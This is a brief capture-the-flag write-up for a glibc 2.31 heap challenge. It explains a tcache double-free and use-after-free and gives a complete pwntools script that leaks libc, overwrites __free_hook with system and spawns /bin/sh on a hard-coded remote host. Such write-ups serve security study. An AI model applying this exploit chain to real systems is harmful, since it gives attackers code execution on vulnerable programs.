​Flavor was a heap challenge,

basically double free on libc-2.31, with an uaf ..

The solution was to allocate a 0x40 bloc in tcache, and a bloc of 0x90 next to him.

Free the 0x40 bloc  7 times by modifying it's bloc key to avoir double free like

in [this explanation](https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/tcache_double_free.c)

then free it one more time to make it goes to unsorted, and leak libc address..

then we double free the 0x90 bloc previously allocated...

then use it to write over _free_hook...

**like this:
**
```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./vuln')
libc = ELF('./libc.so.6')

host, port = "206.189.113.236", "30674"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

def buy(id):
  p.sendlineafter('> ', 'b')
  p.sendlineafter('ID:\n', str(id))

def Buy(id):
  p.sendlineafter('> ', 'B')
  p.sendlineafter('ID:\n', str(id))


def sell(idx):
  p.sendlineafter('> ', 's')
  p.sendlineafter('index?\n', str(idx))

def edit(idx,price,name):
  p.sendlineafter('> ', 'e')
  p.sendlineafter('index?\n', str(idx))
  p.sendlineafter('price:\n', str(price))
  p.sendlineafter('name:\n', name)

def view(idx):
  p.sendlineafter('> ', 'v')
  p.sendlineafter('index?\n', str(idx))

Buy(0)	# 0
buy(0)  # 1
Buy(0)  # 2

# fill tcache 0x40 line (changing bloc key to avoid double free detection)
for i in range(7):
  sell(1)
  edit(1, 64,'pipo')

# next one goes in unsorted
sell(1)

# leak libc address
view(1)
p.recvuntil('ID: ')
leak1 = int(p.recvuntil('\n',drop=True),10)
print('leak libc = '+hex(leak1))
libc.address = leak1 - 0x1ebbe0
print('libc base = '+hex(libc.address))

for i in range(3):
  sell(2)
  edit(2, 64,'pipo')

# we overwrite __free_hook with system
Buy(libc.symbols['__free_hook'])	# 3
Buy(u64(b'/bin/sh\x00'))		# 4
Buy(libc.symbols['system'])		# 5

# system('/bin/sh')
sell(4)

p.interactive()
```

*nobodyisnobody still pwning things..*

